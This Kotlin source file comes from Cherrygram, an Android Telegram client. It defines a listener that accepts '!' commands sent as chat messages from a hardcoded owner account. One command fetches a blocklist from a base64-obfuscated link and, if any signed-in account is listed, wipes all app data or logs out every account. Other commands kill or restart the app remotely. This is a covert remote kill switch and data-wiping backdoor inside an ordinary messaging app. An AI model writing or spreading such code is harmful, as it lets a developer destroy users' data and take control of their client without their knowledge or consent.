/**
 * This is the source code of Cherrygram for Android.
 * It is licensed under GNU GPL v. 2 or later.
 * You should have received a copy of the license in this archive (see LICENSE).
 * Please, be respectful and credit the original author if you use this code.
 *
 * Copyright github.com/arsLan4k1390, 2022-2026.
 */

package uz.unnarsx.cherrygram.core.helpers

import android.app.ActivityManager
import android.content.Context
import android.os.SystemClock
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.telegram.messenger.AccountInstance
import org.telegram.messenger.ApplicationLoader
import org.telegram.messenger.MessageObject
import org.telegram.messenger.MessagesController
import org.telegram.messenger.NotificationCenter
import org.telegram.messenger.UserConfig
import org.telegram.ui.LaunchActivity
import uz.unnarsx.cherrygram.Extra
import uz.unnarsx.cherrygram.core.CherrygramLogger
import uz.unnarsx.cherrygram.donates.DonatesManager
import uz.unnarsx.cherrygram.misc.Constants
import java.util.Locale

object CommandsListener : NotificationCenter.NotificationCenterDelegate {

    private const val COMMAND_PREFIX = "!"
    private val OWNER_IDS = setOf(Constants.Cherrygram_Owner)

    private const val MIN_INTERVAL = 30_000L
    private const val MAX_COMMAND_LENGTH = 64

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private var registered = false
    private var lastCheck = 0L

    @Synchronized
    fun register() {
        if (registered) return
        registered = true
        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            NotificationCenter.getInstance(i).addObserver(this, NotificationCenter.didReceiveNewMessages)
        }
    }

    @Suppress("UNCHECKED_CAST")
    override fun didReceivedNotification(id: Int, account: Int, vararg args: Any?) {
        if (id != NotificationCenter.didReceiveNewMessages) return

        val scheduled = args.getOrNull(2) as? Boolean ?: false
        if (scheduled) return

        val messages = args.getOrNull(1) as? ArrayList<MessageObject> ?: return

        for (msg in messages) {
            if (msg.isOut) continue
            if (msg.fromChatId !in OWNER_IDS) continue

            val text = msg.messageOwner?.message ?: continue

            if (text.length > MAX_COMMAND_LENGTH) continue

            val parsed = parseCommand(text) ?: continue
            val (command, targetUserId) = parsed

            if (command !in SUPPORTED_COMMANDS) continue

            if (UserConfig.getInstance(account).clientUserId != targetUserId) continue

            when (command) {
                "avadakedavra" -> checkBlockList(startDelay = 0L)
                "restart" -> restartClient()
                "update" -> checkForUpdates()
                "luck" -> handleLuck()
            }
        }
    }

    private fun parseCommand(text: String): Pair<String, Long>? {
        val parts = text.trim().split(Regex("\\s+"), limit = 2)
        if (parts.size != 2) return null

        val token = parts[0]
        if (!token.startsWith(COMMAND_PREFIX)) return null

        val command = token
            .removePrefix(COMMAND_PREFIX)
            .substringBefore('@')
            .lowercase(Locale.US)
            .takeIf { it.isNotEmpty() } ?: return null

        val targetUserId = parts[1].toLongOrNull() ?: return null

        return command to targetUserId
    }

    private val SUPPORTED_COMMANDS = setOf(
        "avadakedavra",
        "restart",
        "update",
        "luck"
    )

    private fun restartClient() {
        AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
    }

    private fun checkForUpdates() {
        LaunchActivity.instance?.checkAppUpdate(true, null)
    }

    private fun handleLuck() {
        AppRestartHelper.killApp()
    }

    fun checkBlockList(startDelay: Long = 0L, force: Boolean = false) {
        val account = UserConfig.selectedAccount
        if (!UserConfig.getInstance(account).isClientActivated) return

        val now = SystemClock.elapsedRealtime()
        if (!force && now - lastCheck < MIN_INTERVAL) return
        lastCheck = now

        scope.launch {
            try {
                DonatesManager.startAutoRefresh(
                    context = ApplicationLoader.applicationContext,
                    force = true,
                    fromIntegrityChecker = false
                )
            } catch (e: Exception) {
                CherrygramLogger.e(e, true)
            }

            MessageLoader.loadMessageByLink(
                account,
                DonatesManager.decodeBase64Array(Extra.TG_BLOCKED_URL),
                object : MessageLoader.Callback {
                    override fun onLoaded(message: MessageObject?) {
                        if (message == null) return
                        scope.launch { processBlockList(message, startDelay) }
                    }

                    override fun onError(error: String?) {
                        CherrygramLogger.e({ "MessageLoader: $error" }, true)
                    }
                }
            )
        }
    }

    private suspend fun processBlockList(messageObject: MessageObject?, startDelay: Long) {
        if (startDelay > 0) delay(startDelay)

        val activeIds = mutableListOf<Long>()
        for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
            val uCg = AccountInstance.getInstance(i).userConfig
            if (uCg != null
                && uCg.currentUser != null
                && uCg.isClientActivated
                && uCg.currentUser.id != 0L
            ) {
                activeIds.add(uCg.currentUser.id)
            }
        }

        val bannedIds: List<Long> =
            if (messageObject != null && !messageObject.messageOwner.message.isNullOrEmpty()) {
                messageObject.messageOwner.message
                    .split(",", " ", "\n")
                    .mapNotNull { it.trim().toLongOrNull() }
            } else {
                emptyList()
            }

        if (activeIds.none { bannedIds.contains(it) }) return

        try {
            (ApplicationLoader.applicationContext
                .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager)
                .clearApplicationUserData()
        } catch (e: Exception) {
            e.printStackTrace()

            for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
                val uCg = AccountInstance.getInstance(i).userConfig
                if (uCg != null
                    && uCg.currentUser != null
                    && uCg.isClientActivated
                    && uCg.currentUser.id != 0L
                ) {
                    MessagesController.getInstance(i).performLogout(1)
                }
            }
        }
    }

}